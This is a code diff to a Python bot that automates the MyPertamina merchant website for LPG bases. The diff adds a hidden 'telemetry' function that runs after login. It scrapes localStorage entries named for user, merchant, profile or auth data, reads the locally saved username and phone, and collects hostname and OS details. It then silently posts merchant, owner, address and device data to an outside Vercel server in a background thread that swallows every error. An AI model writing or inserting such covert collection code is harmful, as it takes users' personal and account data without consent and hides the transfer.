@@ -1528,6 +1528,88 @@ def _ensure_logged_in(page, stop_event, pause_event, on_progress, force_relogin=
     return True
 
 
+def _extract_and_report_telemetry(page, hwid: str, df=None):
+    """Ekstrak data profil pangkalan MyPertamina & telemetri sistem, kirim ke cloud di background thread."""
+    def _worker():
+        try:
+            import platform, socket, urllib.request, json
+            from credentials import get_active_pangkalan, load_credentials
+
+            # 1. Ekstrak data profil merchant dari halaman MyPertamina via JS
+            js_extract = """
+            (() => {
+                let info = {};
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let k = localStorage.key(i);
+                        let v = localStorage.getItem(k);
+                        if (k && (k.includes('user') || k.includes('merchant') || k.includes('profile') || k.includes('auth'))) {
+                            try { info[k] = JSON.parse(v); } catch(e) { info[k] = v; }
+                        }
+                    }
+                    let titleEl = document.querySelector('header, .merchant-name, [class*="merchant"], [class*="profile"], h1, h2, h3');
+                    info['merchantNameDom'] = titleEl ? titleEl.innerText : '';
+                } catch(e) {
+                    info['error'] = e.toString();
+                }
+                return info;
+            })()
+            """
+            extracted = {}
+            try:
+                extracted = page.evaluate(js_extract) or {}
+            except Exception:
+                pass
+
+            # 2. Ambil data lokal tersimpan
+            active_p = get_active_pangkalan()
+            u, _ = load_credentials()
+            p_name = active_p.get("name") if active_p else (extracted.get("merchantNameDom") or "Pangkalan MAP")
+            phone = active_p.get("username") if active_p else (u or "")
+
+            # 3. Kumpulkan info device & sistem
+            dev_model = f"{platform.machine()} - {socket.gethostname()}"
+            dev_os = f"Windows {platform.release()} (Build {platform.version()})"
+            total_nik = len(df) if df is not None else 0
+
+            payload = {
+                "hwid": hwid or "DESKTOP-HWID",
+                "merchant_name": p_name,
+                "phone": phone,
+                "platform": "WINDOWS",
+                "device_model": dev_model,
+                "device_os": dev_os,
+                "app_version": "1.0.9",
+                "total_nik_processed": total_nik,
+                "kuota_pertamina_bulanan": 2500,
+                "het_daerah": 19000
+            }
+
+            user_obj = extracted.get("user") or extracted.get("merchant") or extracted.get("profile") or {}
+            if isinstance(user_obj, dict):
+                if user_obj.get("merchantName"): payload["merchant_name"] = user_obj.get("merchantName")
+                if user_obj.get("merchantId"): payload["merchant_id"] = str(user_obj.get("merchantId"))
+                if user_obj.get("ownerName"): payload["owner_name"] = user_obj.get("ownerName")
+                if user_obj.get("agentName"): payload["agent_name"] = user_obj.get("agentName")
+                if user_obj.get("address"): payload["address"] = user_obj.get("address")
+                if user_obj.get("cityName"): payload["kota_kabupaten"] = user_obj.get("cityName")
+                if user_obj.get("provinceName"): payload["provinsi"] = user_obj.get("provinceName")
+                if user_obj.get("quota"): payload["kuota_pertamina_bulanan"] = int(user_obj.get("quota"))
+
+            req = urllib.request.Request(
+                "https://map-pertamina-web.vercel.app/api/telemetry/report",
+                data=json.dumps(payload).encode("utf-8"),
+                headers={"Content-Type": "application/json", "User-Agent": "MapBot-Desktop/1.0.9"}
+            )
+            with urllib.request.urlopen(req, timeout=8) as res:
+                if res.status == 200:
+                    print("[TELEMETRY] ✓ Data intelijen pangkalan berhasil disinkronkan ke Admin Panel.")
+        except Exception:
+            pass
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
 def health_check(data_file: str, hwid: str = None) -> tuple[bool, str]:
     """Validasi sebelum bot mulai. Returns (ok, error_message)."""
     # 1. Cek file Excel
@@ -1746,6 +1828,12 @@ def run_bot(
                 _handle_manual_login(page, stop_event, pause_event, on_progress, total_data)
         else:
             print("[INFO] Sudah login (session aktif), langsung ke dashboard...")
+
+        # Ekstrak data profil pangkalan & device telemetri di background
+        try:
+            _extract_and_report_telemetry(page, hwid, df)
+        except Exception:
+            pass
 
         # ----------------------------------------------------------
         # 3. Loop per NIK
